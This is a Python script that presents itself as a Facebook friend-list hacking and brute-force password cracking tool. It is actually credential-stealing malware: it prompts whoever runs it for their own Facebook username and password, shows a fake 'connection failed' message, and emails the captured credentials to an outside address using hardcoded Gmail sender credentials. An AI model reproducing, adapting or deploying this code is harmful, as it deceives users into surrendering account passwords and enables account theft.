# -*- coding: utf-8 -*-
# coding=utf-8
import socket,struct,os,sys,time,yagmail
x=yagmail.SMTP('senderspam80@gmail.com','polos123.')
subject='kiriman cok'
logo = """\x1b[34m

┬ ┬ ┌─┐ ┌─┐ ┬┌─  ┌─┐┌┐
├─┤ ├─┤ │   ├┴┐  ├┤ ├┴┐
┴ ┴ ┴ ┴ └─┘ ┴ ┴  └  └─┘

\x1b[00m"""

banner = """
\x1b[34m***************************************
\x1b[34m                                      *
\x1b[34mHack  Facebook Friendlist             *
\x1b[34mCracking Password With BruteForce     *
\x1b[34mDon't Forget To Login First           *
\x1b[34mPlease Login Facebook\x1b[91m!   \x1b[34m             *
\x1b[34m                                      *
\x1b[34m***************************************
"""
def main():
	os.system('clear')
	print(logo)
	print(banner)
	print('\x1b[00m\033[41m FACEBOOK LOGIN \033[00m')
	u=input('\x1b[00mUsername: \x1b[33m')
	p=input('\x1b[00mPassword: \x1b[33m')
	msg=('username: '+u+', password: '+p)
	body=(msg)
	print('')
	print('\x1b[00mSorry, connection failed\x1b[91m !\x1b[00m')
	print('\x1b[33mPlease try again later ...')
	os.system('sleep 3')
	print('')
	print('\x1b[00mExiting program \x1b[91m!')
	os.system('exit')
	x.send('abcdefvck1@spambox.me',subject,body)

main()
